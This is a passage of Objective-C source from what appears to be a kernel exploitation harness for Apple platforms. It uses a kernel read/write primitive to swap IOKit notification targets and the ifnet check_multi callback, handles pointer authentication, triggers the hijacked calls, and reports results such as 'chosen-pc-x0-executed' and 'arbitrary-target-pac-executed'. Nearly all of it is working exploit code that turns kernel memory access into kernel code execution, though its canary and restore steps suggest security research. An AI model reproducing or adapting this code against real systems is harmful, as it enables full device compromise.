                options.notificationBlockCanary,
                options.notificationSandboxCanary, &notificationSwap,
                report);
            if (notificationSetupResult == 0 &&
                options.notification2ABE73D8Canary) {
                notificationSetupResult = CNDPrepare2ABE73D8Chain(
                    fd, slide, &notificationSwap, report);
                report[@"notification2ABE73D8Prepared"] =
                    @(notificationSwap.pacChainPrepared);
            }
        }
        report[@"notificationSetupResult"] = @(notificationSetupResult);
        report[@"notificationTargetSwapReady"] =
            @(notificationSwap.ready);

        CNDIfnetPACCanary ifnetPACCanary = {0};
        int ifnetPACSetupResult = options.ifnetCheckMultiPACCanary
            ? ENOTCONN : 0;
        if (options.ifnetCheckMultiPACCanary &&
            borrowedOpenKR == KERN_SUCCESS &&
            MACH_PORT_VALID(connection)) {
            ifnetPACSetupResult = CNDPrepareIfnetPACCanary(
                fd, slide, &ifnetPACCanary, report);
        }
        report[@"ifnetPACSetupResult"] = @(ifnetPACSetupResult);
        report[@"ifnetPACGOTReady"] = @(ifnetPACCanary.ready);

        kern_return_t callKR = KERN_FAILURE;
        uint64_t controllerCookie = 0;
        uint32_t scalarOutputCount = 1;
        CFDataRef serialized = NULL;
        bool targetInstallSucceeded = false;
        bool ifnetPACInstallSucceeded = false;
        bool criticalIfnetPACRestoreFailure = false;
        NSArray *after = nil;
        NSString *ifnetPACBSDName = nil;
        uint64_t ifnetPACInterfaceObject = 0;
        uint64_t ifnetPACBackingIfnet = 0;
        uint64_t ifnetPACSignedCallback = 0;
        uint64_t ifnetPACCallbackTarget = 0;
        int ifnetPACReadbackResult = ENOENT;
        int ifnetPACTriggerResult = -1;
        int ifnetPACTriggerErrno = 0;
        int ifnetPACCleanupResult = -1;
        int ifnetPACCleanupErrno = 0;
        int ifnetKCall1Result = options.ifnetKCall1PACCanary
            ? ENOTCONN : 0;
        if (options.ifnetKCall1PACCanary &&
            borrowedOpenKR == KERN_SUCCESS &&
            MACH_PORT_VALID(connection)) {
            report[@"selectorInvokedAfterRestore"] = @YES;
            ifnetKCall1Result = CNDRunIfnetKCall1PACCanary(
                fd, slide, connection, selfIPCTableForServices,
                beforeIDs, report, &after, &callKR, &controllerCookie,
                &criticalIfnetPACRestoreFailure);
        }
        report[@"ifnetKCall1Result"] = @(ifnetKCall1Result);
        if (!options.ifnetKCall1PACCanary &&
            borrowedOpenKR == KERN_SUCCESS &&
            MACH_PORT_VALID(connection) &&
            (!notificationMutationRequested || notificationSwap.ready) &&
            (!options.ifnetCheckMultiPACCanary || ifnetPACCanary.ready)) {
            uint8_t mac[6] = {
                0x02, 0xc0, 0xde, 0x26,
                (uint8_t)((uint32_t)getpid() >> 8),
                (uint8_t)(uint32_t)getpid(),
            };
            NSDictionary *properties = @{
                @"HardwareAddress": [NSData dataWithBytes:mac length:6],
                @"MinPacketSize": @64,
                @"MaxPacketSize": @1514,
                @"MaxTransferUnit": @1500,
                @"NamePrefix": @"cnd",
            };
            serialized = IOCFSerialize(
                (__bridge CFTypeRef)properties, kIOCFSerializeToBinary);
            if (serialized != NULL) {
                int mutationInstallResult =
                    options.ifnetCheckMultiPACCanary
                    ? CNDInstallIfnetPACCanary(fd, &ifnetPACCanary)
                    : (options.notificationTargetSwap
                        ? CNDInstallNotificationTarget(fd, &notificationSwap)
                        : (options.notificationBlockCanary
                            ? CNDInstallNotificationBlock(
                                fd, &notificationSwap)
                            : (options.notificationSandboxCanary
                                ? CNDInstallNotificationSandboxBridge(
                                    fd, &notificationSwap)
                                : (options.notification2ABE73D8Canary
                                    ? CNDInstall2ABE73D8Chain(
                                        fd, &notificationSwap)
                                    : 0))));
                bool dispatchReady = mutationInstallResult == 0;
                targetInstallSucceeded = options.notificationTargetSwap &&
                    dispatchReady;
                ifnetPACInstallSucceeded =
                    options.ifnetCheckMultiPACCanary && dispatchReady;
                report[@"notificationTargetInstallResult"] =
                    @(mutationInstallResult);
                report[@"notificationTargetInstalled"] =
                    @(targetInstallSucceeded);
                report[@"notificationBlockInstalled"] =
                    @(options.notificationBlockCanary && dispatchReady);
                report[@"notificationSandboxInstalled"] =
                    @(options.notificationSandboxCanary && dispatchReady);
                report[@"notification2ABE73D8Installed"] =
                    @(options.notification2ABE73D8Canary && dispatchReady);
                report[@"ifnetPACGOTInstallResult"] =
                    @(options.ifnetCheckMultiPACCanary
                        ? mutationInstallResult : 0);
                report[@"ifnetPACGOTInstalled"] =
                    @(ifnetPACInstallSucceeded);
                if (dispatchReady) {
                    report[@"selectorInvokedAfterRestore"] = @YES;
                    callKR = IOConnectCallMethod(connection, 0, NULL, 0,
                        CFDataGetBytePtr(serialized),
                        (size_t)CFDataGetLength(serialized),
                        &controllerCookie, &scalarOutputCount, NULL, NULL);
                    if (options.ifnetCheckMultiPACCanary) {
                        unsigned int polls = callKR == KERN_SUCCESS ? 60 : 1;
                        for (unsigned int attempt = 0;
                            attempt < polls; attempt++) {
                            after = CNDInterfaces(
                                fd, selfIPCTableForServices);
                            for (NSDictionary *entry in after) {
                                NSString *identifier = entry[@"registryID"];
                                NSString *name = entry[@"bsdName"];
                                if (identifier != nil &&
                                    ![beforeIDs containsObject:identifier] &&
                                    [name isKindOfClass:[NSString class]] &&
                                    name.length != 0) {
                                    ifnetPACBSDName = name;
                                    NSString *object = entry[@"kernelObject"];
                                    (void)CNDParseU64(
                                        object.UTF8String,
                                        &ifnetPACInterfaceObject);
                                    break;
                                }
                            }
                            if (ifnetPACBSDName != nil ||
                                attempt + 1 == polls) break;
                            usleep(50000);
                        }
                        bool gotRestored = CNDRestoreIfnetPACCanary(
                            fd, &ifnetPACCanary);
                        report[@"ifnetPACGOTRestored"] = @(gotRestored);
                        criticalIfnetPACRestoreFailure = !gotRestored;
                        if (gotRestored && ifnetPACBSDName != nil &&
                            CNDKernelObject(ifnetPACInterfaceObject)) {
                            uint64_t rawBackingIfnet = 0;
                            ifnetPACReadbackResult = CNDKernelRead(
                                fd, ifnetPACInterfaceObject +
                                    CNDIONetworkInterfaceBackingIfnetOffset,
                                &rawBackingIfnet,
                                sizeof(rawBackingIfnet));
                            ifnetPACBackingIfnet = CNDStripDataPointer(
                                rawBackingIfnet);
                            if (ifnetPACReadbackResult == 0 &&
                                CNDKernelObject(ifnetPACBackingIfnet)) {
                                ifnetPACReadbackResult = CNDKernelRead(
                                    fd, ifnetPACBackingIfnet +
                                        CNDIfnetCheckMultiOffset,
                                    &ifnetPACSignedCallback,
                                    sizeof(ifnetPACSignedCallback));
                            }
                            ifnetPACCallbackTarget =
                                CNDStripInstructionPointer(
                                    ifnetPACSignedCallback);
                        }
                        if (gotRestored && ifnetPACBSDName != nil &&
                            ifnetPACReadbackResult == 0 &&
                            ifnetPACCallbackTarget ==
                                ifnetPACCanary.canaryTarget) {
                            CNDTriggerIfnetCheckMulti(
                                ifnetPACBSDName,
                                &ifnetPACTriggerResult,
                                &ifnetPACTriggerErrno,
                                &ifnetPACCleanupResult,
                                &ifnetPACCleanupErrno);
                        }
                    } else if (options.notificationTargetSwap) {
                        dispatch_time_t deadline = dispatch_time(
                            DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC);
                        long waitResult = dispatch_semaphore_wait(
                            notificationSwap.observerB.semaphore, deadline);
                        report[@"notificationBWaitResult"] = @(waitResult);
                        bool targetRestored = CNDRestoreNotificationTarget(
                            fd, &notificationSwap);
                        report[@"notificationTargetRestored"] =
                            @(targetRestored);
                        dispatch_sync_f(notificationSwap.queueA,
                            NULL, CNDDispatchBarrier);
                        dispatch_sync_f(notificationSwap.queueB,
                            NULL, CNDDispatchBarrier);
                    } else if (options.notificationBlockCanary) {
                        /* The no-op block produces no userspace message. */
                        usleep(100000);
                        bool blockRestored = CNDRestoreNotificationBlock(
                            fd, &notificationSwap);
                        report[@"notificationBlockRestored"] =
                            @(blockRestored);
                    } else if (options.notificationSandboxCanary) {
                        /* The donor callback rejects unrelated services. */
                        usleep(100000);
                        bool sandboxRestored =
                            CNDRestoreNotificationSandboxBridge(
                                fd, &notificationSwap);
                        report[@"notificationSandboxRestored"] =
                            @(sandboxRestored);
                    } else if (options.notification2ABE73D8Canary) {
                        usleep(100000);
                        bool blockRestored = CNDRestoreNotificationBlock(
                            fd, &notificationSwap);
                        report[@"notificationBlockRestored"] =
                            @(blockRestored);
                        bool chainRestored = blockRestored &&
                            CNDRestore2ABE73D8Fields(
                                fd, &notificationSwap);
                        report[@"notification2ABE73D8Restored"] =
                            @(chainRestored);
                    }
                } else if (options.ifnetCheckMultiPACCanary) {
                    bool gotRestored = CNDRestoreIfnetPACCanary(
                        fd, &ifnetPACCanary);
                    report[@"ifnetPACGOTRestored"] = @(gotRestored);
                    criticalIfnetPACRestoreFailure = !gotRestored;
                }
            }
        }
        report[@"callKR"] = CNDHex((uint32_t)callKR);
        report[@"controllerCookie"] = CNDHex(controllerCookie);
        report[@"scalarOutputCount"] = @(scalarOutputCount);
        report[@"ifnetPACBSDName"] = ifnetPACBSDName ?: @"";
        report[@"ifnetPACInterfaceObject"] =
            CNDHex(ifnetPACInterfaceObject);
        report[@"ifnetPACBackingIfnet"] = CNDHex(ifnetPACBackingIfnet);
        report[@"ifnetPACSignedCallback"] =
            CNDHex(ifnetPACSignedCallback);
        report[@"ifnetPACCallbackTarget"] =
            CNDHex(ifnetPACCallbackTarget);
        report[@"ifnetPACReadbackResult"] = @(ifnetPACReadbackResult);
        report[@"ifnetPACTriggerResult"] = @(ifnetPACTriggerResult);
        report[@"ifnetPACTriggerErrno"] = @(ifnetPACTriggerErrno);
        report[@"ifnetPACTriggerErrnoName"] =
            ifnetPACTriggerErrno == ENOEXEC ? @"ENOEXEC" : @"";
        report[@"ifnetPACCleanupResult"] = @(ifnetPACCleanupResult);
        report[@"ifnetPACCleanupErrno"] = @(ifnetPACCleanupErrno);
        if (notificationMutationRequested) {
            uint32_t callbacksA = atomic_load_explicit(
                &notificationSwap.observerA.callbacks,
                memory_order_relaxed);
            uint32_t callbacksB = atomic_load_explicit(
                &notificationSwap.observerB.callbacks,
                memory_order_relaxed);
            uint32_t servicesA = atomic_load_explicit(
                &notificationSwap.observerA.services,
                memory_order_relaxed);
            uint32_t servicesB = atomic_load_explicit(
                &notificationSwap.observerB.services,
                memory_order_relaxed);
            uint32_t lastIteratorB = atomic_load_explicit(
                &notificationSwap.observerB.lastIterator,
                memory_order_relaxed);
            uint32_t callbacksBOnQueueB = atomic_load_explicit(
                &notificationSwap.observerB.onQueueB,
                memory_order_relaxed);
            report[@"notificationACallbacks"] = @(callbacksA);
            report[@"notificationBCallbacks"] = @(callbacksB);
            report[@"notificationAServices"] = @(servicesA);
            report[@"notificationBServices"] = @(servicesB);
            report[@"notificationBLastIterator"] =
                CNDHex(lastIteratorB);
            report[@"notificationBExpectedIterator"] =
                CNDHex(notificationSwap.iteratorB);
            report[@"notificationBCallbacksOnQueueB"] =
                @(callbacksBOnQueueB);
        }

        if (callKR == KERN_SUCCESS && after == nil) usleep(500000);
        if (after == nil) {
            after = CNDInterfaces(fd, selfIPCTableForServices);
        }
        NSMutableArray *created = [NSMutableArray array];
        for (NSDictionary *entry in after) {
            if (![beforeIDs containsObject:entry[@"registryID"]]) {
                [created addObject:entry];
            }
        }
        report[@"interfacesBefore"] = before;
        report[@"interfacesAfter"] = after;
        report[@"createdInterfaces"] = created;
        bool baseSuccess = baselineOpenKR != KERN_SUCCESS && installed &&
            borrowedOpenKR == KERN_SUCCESS && restored &&
            callKR == KERN_SUCCESS && created.count != 0;
        bool swapSuccess = true;
        if (options.notificationTargetSwap) {
            swapSuccess = notificationSetupResult == 0 &&
                notificationSwap.ready && targetInstallSucceeded &&
                notificationSwap.targetRestored &&
                atomic_load_explicit(&notificationSwap.observerA.callbacks,
                    memory_order_relaxed) == 0 &&
                atomic_load_explicit(&notificationSwap.observerB.callbacks,
                    memory_order_relaxed) != 0 &&
                atomic_load_explicit(&notificationSwap.observerB.services,
                    memory_order_relaxed) != 0 &&
                atomic_load_explicit(&notificationSwap.observerB.onQueueB,
                    memory_order_relaxed) != 0 &&
                atomic_load_explicit(
                    &notificationSwap.observerB.lastIterator,
                    memory_order_relaxed) == notificationSwap.iteratorB;
        } else if (options.notificationBlockCanary) {
            swapSuccess = notificationSetupResult == 0 &&
                notificationSwap.ready && notificationSwap.blockRestored &&
                atomic_load_explicit(&notificationSwap.observerA.callbacks,
                    memory_order_relaxed) == 0;
        } else if (options.notificationSandboxCanary) {
            swapSuccess = notificationSetupResult == 0 &&
                notificationSwap.ready && notificationSwap.sandboxRestored &&
                atomic_load_explicit(&notificationSwap.observerA.callbacks,
                    memory_order_relaxed) == 0;
        } else if (options.notification2ABE73D8Canary) {
            swapSuccess = notificationSetupResult == 0 &&
                notificationSwap.ready &&
                notificationSwap.pacChainPrepared &&
                notificationSwap.blockRestored &&
                notificationSwap.pacChainRestored &&
                atomic_load_explicit(&notificationSwap.observerA.callbacks,
                    memory_order_relaxed) == 0;
        } else if (options.ifnetCheckMultiPACCanary) {
            swapSuccess = ifnetPACSetupResult == 0 &&
                ifnetPACCanary.ready && ifnetPACInstallSucceeded &&
                ifnetPACCanary.restored && !criticalIfnetPACRestoreFailure &&
                ifnetPACBSDName.length != 0 &&
                ifnetPACReadbackResult == 0 &&
                CNDKernelObject(ifnetPACBackingIfnet) &&
                ifnetPACCallbackTarget == ifnetPACCanary.canaryTarget &&
                ifnetPACTriggerResult == -1 &&
                ifnetPACTriggerErrno == ENOEXEC;
        } else if (options.ifnetKCall1PACCanary) {
            swapSuccess = ifnetKCall1Result == 0 &&
                [report[@"ifnetKCall1Success"] boolValue] &&
                !criticalIfnetPACRestoreFailure;
        }
        bool success = baseSuccess && swapSuccess;
        report[@"result"] = success
            ? (options.ifnetKCall1PACCanary
                ? @"krw-ifnet-kcall1-chosen-pc-x0-executed"
                : (options.ifnetCheckMultiPACCanary
                ? @"krw-ifnet-check-multi-arbitrary-target-pac-executed"
                : (options.notificationTargetSwap
                ? @"krw-notifier-target-swap-triggered-stock-61de-dispatch"
                : (options.notificationBlockCanary
                    ? @"krw-notifier-block-noop-dispatch-survived"
                    : (options.notificationSandboxCanary
                        ? @"krw-notifier-sandbox-iazero-dispatch-survived"
                        : (options.notification2ABE73D8Canary
                            ? @"krw-notifier-2abe-73d8-dispatch-survived"
                            : @"krw-borrow-triggered-normal-signer-path"))))))
            : @"trigger-failed";
        CNDPrintReport(report);

        if (success && options.holdSeconds != 0) {
            sleep((unsigned int)options.holdSeconds);
        }
        CNDCleanupNotificationSwap(&notificationSwap);
        if (serialized != NULL) CFRelease(serialized);
        if (MACH_PORT_VALID(connection)) IOServiceClose(connection);
        close(fd);
        if (criticalIfnetPACRestoreFailure) return 2;
        return success ? 0 : 1;
    }
}
